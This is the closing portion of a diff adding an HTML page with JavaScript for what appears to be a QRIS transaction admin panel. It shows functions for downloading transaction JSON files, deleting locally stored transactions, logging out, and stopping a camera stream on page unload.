+                const url = URL.createObjectURL(blob);
+                const link2 = document.createElement('a');
+                link2.href = url;
+                link2.download = `QRIS/${trans.id}_info.json`;
+                link2.click();
+            });
+
+            alert(`Folder QRIS dengan ${transactions.length} transaksi berhasil diunduh!`);
+        }
+
+        function deleteTransaction(idx) {
+            if (confirm('Hapus transaksi ini?')) {
+                transactions.splice(idx, 1);
+                localStorage.setItem('qrisTransactions', JSON.stringify(transactions));
+                loadTransactions();
+            }
+        }
+
+        function logoutAdmin() {
+            document.getElementById('adminPanel').classList.add('hidden');
+            document.getElementById('homepage').classList.remove('hidden');
+            document.getElementById('adminUser').value = '';
+            document.getElementById('adminPass').value = '';
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        });
+    </script>
+</body>
+</html>
